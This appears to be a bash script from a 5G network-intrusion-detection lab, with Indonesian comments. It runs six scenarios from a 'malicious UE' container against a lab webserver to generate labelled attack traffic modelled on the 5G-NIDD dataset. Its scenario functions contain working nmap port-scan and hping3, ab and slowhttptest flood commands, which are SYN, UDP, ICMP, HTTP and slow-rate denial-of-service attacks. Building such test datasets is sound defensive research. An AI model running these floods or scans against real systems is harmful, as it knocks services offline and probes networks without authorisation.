#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
# Tier 0 — Serangan N6 dari UE jahat (ue-mal) ke webserver.
# Model acuan: dataset 5G-NIDD (Samarakoon et al., 2022).
# Semua skenario sumber = uesimtun0 ue-mal (10.45.x.x), target = webserver.
# Tiap skenario lewat scripts/run_scenario.sh (guard subnet + ground truth).
#
#   bash scenarios/tier0_n6/run_tier0.sh [all|T0-01..T0-06]
# ─────────────────────────────────────────────────────────────
set -euo pipefail
cd "$(dirname "$0")/../.."
RS="scripts/run_scenario.sh"
DX() { docker "$@"; }

DST="172.24.0.10"       # webserver (N6)
IFACE="N6"
WHICH="${1:-all}"

# ── Pastikan ue-mal online + punya uesimtun0 ──
ensure_ue_mal() {
  DX compose up -d ue-mal >/dev/null 2>&1 || DX start ue-mal >/dev/null 2>&1 || true
  local ip=""
  for i in $(seq 1 30); do
    ip=$(DX exec ue-mal sh -c "ip -4 addr show uesimtun0 2>/dev/null | awk '/inet /{print \$2}' | cut -d/ -f1" 2>/dev/null || true)
    [[ -n "$ip" ]] && break; sleep 2
  done
  [[ -z "$ip" ]] && { echo "[!] ue-mal tidak dapat PDU session. Lihat: docker logs ue-mal"; exit 1; }
  # Rute ke DN via uesimtun0 → tool serangan (hping3/ab/slowhttptest) tak perlu bind manual.
  DX exec ue-mal ip route replace 172.24.0.0/24 dev uesimtun0 >/dev/null 2>&1 || true
  echo "$ip"
}

SRC="$(ensure_ue_mal)"
echo "== ue-mal uesimtun0 = $SRC → target $DST (N6) =="
# Verifikasi konektivitas N6 dulu
DX exec ue-mal ping -I uesimtun0 -c 1 -W 2 "$DST" >/dev/null 2>&1 || echo "[!] peringatan: ping awal gagal (tunnel mungkin belum stabil)"

# ── Definisi skenario (ID label durasi cmd...) ──
run_T0_01() { bash "$RS" 0 T0-01 recon_portscan "$SRC" "$DST" "$IFACE" 40 -- \
  docker exec ue-mal nmap -e uesimtun0 -sS -sU -Pn --top-ports 100 -T4 "$DST"; }

run_T0_02() { bash "$RS" 0 T0-02 dos_synflood "$SRC" "$DST" "$IFACE" 15 -- \
  docker exec ue-mal hping3 -I uesimtun0 -S -p 80 -i u200 "$DST"; }

run_T0_03() { bash "$RS" 0 T0-03 dos_udpflood "$SRC" "$DST" "$IFACE" 15 -- \
  docker exec ue-mal hping3 -I uesimtun0 --udp -p 80 -i u200 "$DST"; }

run_T0_04() { bash "$RS" 0 T0-04 dos_icmpflood "$SRC" "$DST" "$IFACE" 15 -- \
  docker exec ue-mal hping3 -I uesimtun0 --icmp -i u200 "$DST"; }

run_T0_05() { bash "$RS" 0 T0-05 dos_httpflood "$SRC" "$DST" "$IFACE" 20 -- \
  docker exec ue-mal ab -n 200000 -c 50 "http://$DST/"; }

run_T0_06() { bash "$RS" 0 T0-06 dos_slowrate "$SRC" "$DST" "$IFACE" 25 -- \
  docker exec ue-mal slowhttptest -c 500 -H -i 10 -r 50 -t GET -u "http://$DST/" -x 24 -p 3; }

SCENARIOS=( T0-01 T0-02 T0-03 T0-04 T0-05 T0-06 )
run_one() { local id="${1//-/_}"; "run_${id}"; echo; sleep 3; }  # jeda antar skenario (window tak tumpang tindih)

if [[ "$WHICH" == "all" ]]; then
  for s in "${SCENARIOS[@]}"; do run_one "$s"; done
else
  run_one "$WHICH"
fi
echo "== Tier 0 selesai =="
